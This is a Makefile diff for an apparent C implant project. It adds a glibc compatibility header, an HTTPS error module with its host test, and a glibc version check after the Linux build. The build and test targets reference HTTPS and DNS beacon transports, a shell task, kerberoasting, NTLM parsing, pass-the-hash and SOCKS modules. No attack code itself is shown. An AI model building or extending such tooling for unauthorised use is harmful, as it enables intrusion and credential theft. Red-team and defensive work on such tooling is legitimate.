@@ -64,12 +64,13 @@ COMMON_SRCS = \
 ifeq ($(OS),linux)
 CC       = gcc
 OUT      = $(BUILD_DIR)/implant_c_linux
-CFLAGS   = -Wall -Wextra -O2 -std=c11 -Iinclude -D_GNU_SOURCE
+CFLAGS   = -Wall -Wextra -O2 -std=c11 -Iinclude -D_GNU_SOURCE -include include/ark/glibc_compat.h
 LDFLAGS  = -lcurl -lssl -lcrypto -lpthread
 SRCS = $(COMMON_SRCS) \
 	src/platform/platform_linux.c \
 	src/crypto/crypto_linux.c \
 	src/transport/https_linux.c \
+	src/transport/https_err.c \
 	src/transport/dns_linux.c \
 	src/transport/dns_chunk.c \
 	src/tasks/shell_linux.c \
@@ -238,7 +239,13 @@ test-task-typed-linux:
 		-o $(BUILD_DIR)/task_typed_linux_host_test -lssl -lcrypto
 	$(BUILD_DIR)/task_typed_linux_host_test
 
-test-host: test-pathjail test-pb-copy test-kerberoast-pb test-ntlm-parse test-pth-layer test-socks-pb test-socks-parse test-unique-ms test-linux-postex test-linux-cloud test-linux-task-stubs test-task-dispatch test-task-typed-linux
+test-https-err:
+	@mkdir -p $(BUILD_DIR)
+	cc -std=c11 -Wall -Wextra -Iinclude \
+		tests/https_err_host_test.c src/transport/https_err.c -o $(BUILD_DIR)/https_err_host_test
+	$(BUILD_DIR)/https_err_host_test
+
+test-host: test-pathjail test-pb-copy test-kerberoast-pb test-ntlm-parse test-pth-layer test-socks-pb test-socks-parse test-unique-ms test-linux-postex test-linux-cloud test-linux-task-stubs test-task-dispatch test-task-typed-linux test-https-err
 
 config:
 	@chmod +x scripts/gen_config.sh
@@ -257,6 +264,9 @@ config:
 $(OUT): config $(SRCS)
 	@mkdir -p $(BUILD_DIR)
 	$(CC) $(CFLAGS) $(SRCS) -o $(OUT) $(LDFLAGS)
+ifeq ($(OS),linux)
+	python3 scripts/check_glibc.py $(OUT) 2.35
+endif
 
 clean:
 	rm -f include/ark/config.h $(BUILD_DIR)/implant_c.exe $(BUILD_DIR)/implant_c.dll $(BUILD_DIR)/implant_c_linux
